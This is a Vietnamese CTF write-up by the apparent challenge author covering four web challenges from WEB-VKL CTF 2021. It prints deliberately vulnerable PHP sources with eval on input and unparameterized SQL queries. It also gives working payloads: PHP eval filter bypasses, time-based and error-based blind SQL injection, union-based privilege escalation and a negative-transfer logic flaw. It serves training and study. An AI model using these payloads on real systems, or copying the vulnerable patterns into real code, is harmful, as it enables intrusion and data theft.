---
layout: post
title: "WRITEUP WEB-VKL CTF 2021: WEB"
categories: CTF
toc: true
---

Ở bài này mình chỉ viết về 4 challenge của mình nha. (Eval ga VKL 1, Eval ga VKL 2, Baby SQL, FreeFlag).

Source tất cả các bài mình để ở đây [SOURCE](https://github.com/DauHoangTai/CTF/tree/master/2021/webvkl-CTF)
## Challenge Eval ga VKL 1 (5 solved)
Đầu tiên truy cập chall thì chúng ta được nhận 1 source code như sau.
```php
<?php
error_reporting(0);
chdir("/");
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match("/[3-9`~!@#\$%^&*\-=+,;?'\"\[\]\{\}\\\\]|0|pcntl|highlight_file|var|root|func|contents|eval|count|cmp/i",$cmd) || substr_count($cmd,'.') > 2 || strlen($cmd) > 64) {
        die("ấu nâu !");
    } else {
        eval($cmd.";");
    }
} else {
    highlight_file(__FILE__);
}

?>
```
Đầu vào là `cmd` được filter khá kĩ, kiểm tra đầu vào nếu có 2 dấu chấm trở lên thì die và limit len là < 65. Nhưng chú ý thì không có system, exec hay các hàm có thể RCE.
Thử với `?cmd=system(id)` thì nhận được blank page => đời không như là mơ.
Đọc phpinfo() thì thấy các hàm có thể RCE đã bị disable.
Bây giờ quay lại xem có thể sài những kí tự hay hàm nào: `chr strlen log log1p 2 1 print_r readfile end current next` -> đây là một số hàm có thể sử dụng. Bạn có thể check kĩ hơn và viết code để so disable function với function có trong php thì sẽ ra những hàm nào không bị disable nhé.

### Payload
```
Check các file và folder có trong / -> print_r(scandir(chr(strlen(log1p(1).log1p(1).log1p(2)))))
Thấy flag ở cuối array trả về
đọc flag -> readfile(end(scandir(chr(strlen(log1p(1).log1p(1).log1p(2))))))
```
Để mọi người hiểu hơn thì mình debug ở đây nhé
![image](https://user-images.githubusercontent.com/54855855/130331658-48dae587-633e-4efa-81da-8274255fad2a.png)

Flag -> `web-vkl{dm_ch4ll_3z_vllllllll_!!!}`

## Challenge Eval ga VKL 2 (3 solved)

Bài này vẫn được cung cấp source như bài 1.
```php
<?php
error_reporting(0);
chdir("/");
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match("/[3-9`~!@#\$%^&*\-=+.,;?'\"\[\]\{\}\\\\]|\([2]|\_[a-q]|0|1|pcntl|highlight_file|var|root|len|func|contents|eval|count|cmp/i",$cmd) || substr_count($cmd,'ext') > 1 || substr_count($cmd,'scan') > 1) {
        die("ấu nâu !");
    } else {
        eval($cmd.";");
    }
} else {
    highlight_file(__FILE__);
}

?>
```
Đọc thì thấy payload ở ver 1 sẽ không sài được nữa vì đã filter `len 1 `, nếu như sau ( là 2 và sau _ là a-q cũng bị ban. `ext` và `scan` chỉ được xuất hiện 1 lần. Mục đích ở đây là chặn `next` và `scandir` xuất hiện trong input quá 1 lần.

Ở disable function có mở thêm là `array_reverse` nếu ai có check lại sẽ thấy. Nhưng trong các filter thì vẫn sót là `getallheaders()` => sử dụng nó thôi :))

### Payload
![image](https://user-images.githubusercontent.com/54855855/130331892-94ab0fc5-fae2-4a18-a0e7-808b265b5acd.png)
Thêm header `cc: /` và get lên `?cmd=print_r(next(getallheaders()))`. Tới đây thì đã tạo được `/` rồi thì dùng scandir để xem file và folder thôi.
`print_r(scandir(next(getallheaders())))` -> flag nằm ở phần từ thứ 2 ở cuối mảng và có tên `vaday_la_flag_hahah_hihihi_hoho.txt`.

Cuối cùng là đọc flag.
![image](https://user-images.githubusercontent.com/54855855/130332049-b0b40b47-def3-4244-b9be-4d0388d8edd7.png)

Flag -> `web-vkl{Wow_w0w_writ3_p4yl0ad_1n_5s_3625146215!}`

## Challenge Baby SQL (0 solved)
Đầu tiên thử register và login account đó. Khi đăng nhâp vào thì thấy được account có 20 star và status được set là 1. Để vào được `/flag` thì star phải >= 100.
Ở đây mình chỉ cần lập 1 account khác và chuyển số `-100` thì account của mình đã có 120 star. (Lúc đầu mình tính check số âm và để mọi người race nhưng giảm bớt thì mình làm cách này cho lẹ :3 )
Vô được flag.php thì nhận được 1 source code như sau
```php
<?php
session_start();
include_once("config.php");
$stmt = $conn->prepare('select * from users where username=?');
if (!$stmt)
    throw new Exception("prepare query error:" . $conn->error);
$stmt->bind_param('s', $_SESSION['username']);
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    $checkStar = $row['star'];
}
if ($checkStar >= 100) {
    if (isset($_GET['pass'])) {
        $pass = $_GET['pass'];
        if (preg_match("/user|insert|ord|chr|version|len|mid|like|right|substr|exp|cur|ascii|=|and|or|0x|between|rand|convert|sleep|xml|extract|concat|info|sys|[0-9~\/\"<>!^;\\\]/i",$pass)) {
            die("no hack");
        } else {
            // $query = "SELECT flag_ne_hihi FROM flag_here;";
            $query = "SELECT pass FROM users1 where user = 'guest' and pass = '{$pass}';";
            $result = @mysqli_fetch_array(mysqli_query($conn,$query));
            if($result['pass']) {
                // echo "wtf ?";
            }
        }
    } else {
        highlight_file(__FILE__);
    }
} else {
    die ("<script>alert('Not enough stars :( min 100 stars')</script>");
}
?>
```
Đầu tiên thì `pass` là input mình sẽ được đưa thẳng vào câu query sql. dấu `'` cũng không được filter => có thể sql injection.
Sau khi thực hiện câu query thì nếu có data `pass` trả về thì sẽ không in gì cả => tới đây thì cúng đủ nhận thấy là time-base sqli.
Chủ yếu là đoạn filter ở `preg_match`. Ở đây mình đã filter hầu như gần hết các hàm có thể blind sqli, cụ thể hơn là hàm `sleep` có thể sử dụng để exploit time-base sqli. Tiếp theo đó là mình đã filter number [0-9].

Trong mysql mình cũng có thể sử dụng `benchmark` giống như `sleep` để làm delay server responses, nhưng vói điều kiện các tham số trong đó phải đủ lớn. Nếu bạn chưa hiểu có thể tìm hiểu về nó trên google để có thể hiểu rõ hơn.

`left` cũng chưa được filter nên có thể sử dụng để thay `substr`.

`in` để thay cho `= like > <`.

Điều khó là tạo số thì mình sử dụng `INSTR()`, giải thích về hàm này sơ qua đó là nó sẽ trả về vị trí của chuỗi con mình đưa vào. VD: INSTR("a","a") sẽ là 1, INSTR("ba","a") sẽ là 2 => có thể tạo số.

Giờ là đến việc tạo số đủ lớn cho `benchmark()` để có thể làm delay server responses. Ở đây mình sử dụng `pow()` với `pi()` để tạo ra số đủ lớn => ez time-base.

### Payload
```
' || left((select flag_ne_hihi from flag_here),(INSTR('a','a')))in('w')%26%26benchmark((pow(pi()%2bpi(),pi()*pi())),(INSTR('a','a')))%23
```
Khi chạy payload trên mọi người sẽ thấy server sẽ bị delay.

Mình để trong `IN` là chữ `w` vì nó là chữ cái đầu của flag và bị delay, nếu mọi người để char khác thì nó sẽ không delay lâu như vậy. Tới đây mọi người có thể viết code và brute nhé.

Flag -> `web-vkl{Wow_You_Are_Hacker_Sju_Cap}`

## Challenge FreeFlag (1 solved)

Sau khi register và login thì nhận được 1 source như sau
```php
<?php
session_start();
include_once("config.php");
if (isset($_SESSION['username'])) {
    if (isset($_GET['id'])) {
        $id = $_GET['id'];
        if (preg_match("/insert|substr|mid|left|right|ord|pi|chr|sys|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|rand|in|[1-9`~.^\-\/\\\=<>|$]/i",$id)) {
            die("nope !");
        } else {
            $query1 = "SELECT * FROM numbers where id = {$id};";
            $result = $conn->query($query1);
            while ($row = $result->fetch_assoc()) { //db 2 column
                $number = $row['number'];
                // echo $number;
                if ((int)$number === 2050 || (int)$number === 2051) {
                    $_SESSION["admin"] = true;
                    header("Location: flag.php");
                }
                else {
                    die("Try harder :) ");
                }
            }
        }
    } else {
        highlight_file(__FILE__);
    }
} else {
    header("Location: login.php");
}
?>
```
Chúng ta có đầu vào là `id` và được filter rất nhiều hàm trong mysql, check luôn số từ 1-9 và 1 số kí tự. `id` được đưa thẳng vào câu query nên chúng ta có thể sql injection ở đây. Để có thể redirect tới được `flag.php` thì câu query `$query1 = "SELECT * FROM numbers where id = {$id};";` phải có cột number trả về là 2050 hoặc 2051. Khi đó `$_SESSION["admin"]` sẽ set bằng true, mặc định của mỗi account khi mới reg mình set là false.

Lí do mình để 2050 hoặc 2051 là ctf mình diễn ra 2 ngày đó là 21-08-2021 và 22-08-2021, cộng ngày tháng năm lại thì sẽ được 2050 và 2051. Vì vậy mình sài payload sau để có thể redirect tới `flag.php`.
```
?id=0 union select 0,(select((select (day(curdate()))) %2b (select(month(curdate()))) %2b (select(year(curdate())))));
```
Khi vô được `flag.php` thì mở mã nguồn lên thấy được `?source` => access và có source.

```php
<?php
include_once("config.php");
if (isset($_SESSION["admin"]) && $_SESSION["admin"] === true) {
  if (isset($_GET['id'])) {
    $id = $_GET['id'];
    if (preg_match("/insert|substr|mid|left|right|ord|chr|sys|pi|rand|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|in|[1-9`~.^\-\/\\\=<>|$*]/i",$id) || substr_count($id,'0') > 1) {
      die("no hack");
    } else {
      $query = "SELECT id,flag_name,flag_fake FROM flag WHERE id={$id};";
      $result = $conn->query($query);
      while ($row = $result->fetch_assoc()) {
        echo "<tr><th>".$row['id']."</th><th>".$row['flag_name']."</th><th>".$row['flag_fake'];
      }
    }
  }
  if(isset($_GET['ai_di'])) {
    $ai_di = $_GET['ai_di'];
    if (preg_match("/insert|substr|mid|left|right|ord|chr|sys|pi|rand|0x|version|concat|ascii|convert|and|or|procedure|xml|extract|by|create|like|sleep|if|case|db|load|to|count|where|column|in|[2-9`~.^\-\/\\\=<>|$]/i",$ai_di) || substr_count($ai_di,'1') > 1 || substr_count($ai_di,'0') > 2) {
      die("hack ghe vay bro ?");
    } else {
      $query = "SELECT id,flag_name,flag_fake FROM flag WHERE id={$ai_di};";
      $result = mysqli_query($conn,$query);
      if (!$result) {
        echo mysqli_error($conn);
      } else {
        echo "nice!";
      }
    }
  }
} else {
  die("no admin");
}
if (isset($_GET['source'])) {
  readfile("flag.php");
}
?>
```

Đầu tiên thì thấy được trong source này có 3 tham số nhận đầu vào là `id, ai_di, source`. Ở source thì chỉ có chức năng là đọc file. (cho source). Ở `id` thì qua preg_match để filter một số function trong mysql và 1-9 và 1 vài kí tự. 0 không được xuất hiện nhiều hơn 1 lần trong input của mình.

Ở đây sót lại mốt số thứ có thể sài được như là `union select from 0 ()` và một số thứ khác, mọi người có thể tìm thêm :)). 
`$query = "SELECT id,flag_name,flag_fake FROM flag WHERE id={$id};";` id mình truyên vào được đưa vào query này và sau đó lấy ra các giá trị `id, flag_name, flag_fake` và show ra màn hình.
Ở `id` filter còn sót 0 nên mình có thể thử nhập id=0
![image](https://user-images.githubusercontent.com/54855855/130489998-0ca3f220-61d0-4eb4-b323-d6e963d28d0e.png)
Nhìn vào như vậy thì cũng có thể thấy được flag real không nằm trong 3 cột này mà cần phải tìm cột khác chưa flag real.

Tiếp tục đến với `ai_di` thì chúng được filter các fucntion trong mysql như `id`. Các kí tự cũng như thế nhưng chỉ khác number chỉ filter từ 2-9, 1 không được xuất hiện quá 1 lần và 0 không xuất hiện quá 2 lần trong input.

```php
$query = "SELECT id,flag_name,flag_fake FROM flag WHERE id={$ai_di};";
      $result = mysqli_query($conn,$query);
      if (!$result) {
        echo mysqli_error($conn);
      } else {
        echo "nice!";
      }
```
`ai_di` sẽ được đưa vô và execute câu query trên. Nếu có lỗi thì sẽ dump ra lỗi của query đó `echo mysqli_error($conn);`. Execute thánh công sẽ thì sẽ in ra `nice`.
Nhìn vào code trên thì chắc ai cũng đoán được là dựa vô đây để dump ra các cột còn lại có trong `flag` (Error-Based SQL Injection) và từ đó sử dụng `?id` ban đầu để đọc data column đó.

Ở preg_match filter còn sót một số hàm toán như `exp power`, khi truyền vào một số đủ lớn thì 2 hàm đó sẽ trả về kết quả vượt quá range của INT và dump ra lỗi, mình sẽ chain với câu query của mình => dump được tên cột. Mọi người có thể lên google tìm hiểu về 2 hàm này và cách sử dụng nó để dump ra column có trong table.
Link bài viết mình để ở đây
[Error Based SQL Injection Using EXP](https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/). Nhưng trong bài viết này người ta sử dụng `~` hoặc truyển number vào nhưng những thứ đó thì mình đã filter. Chỉ có sót lại là số 0 mà 0 thì bạn nhập bao nhiêu 0 vào cũng không thể vượt quá range của INT được.

Tới đây nếu ai vượt qua được step 1 để vô được `flag.php` thì dễ rồi hehe. Ở step đó là cách tạo số và giờ sử dụng lại nó thôi.

### Payload
Mình sẽ để full payload từ step 1 luôn nhé.

```
Payload lên admin ->  ?id=0 union select 0,(select((select (day(curdate()))) %2b (select(month(curdate()))) %2b (select(year(curdate())))))

Payload dump column -> ?ai_di=0 *(select (exp((SELECT year(curdate())) %2b (select 0 from (SELECT * from flag limit 1) as a))))

Payload đọc flag -> ?id = 0 union select null,null,(select flag_real_siu_cap from flag)
```
Ở bài này có 1 solved và sử dụng hex, mọi người có thể tìm hiểu về hex và sử dụng nó cũng được nhé. Mình đã quên hàm đó :3

## Lời kết
Cảm ơn tất cả mọi người đã tham gia WEB-VKL CTF 2021, mong đây là 1 dịp cho mọi người luyện lại các kĩ năng mà bản thân đã học được cũng như giúp được một số bạn học được kiến thức mới. Nếu có một số sai sót gì về challenge thì mong các bạn bỏ qua ♥

THANK YOU !
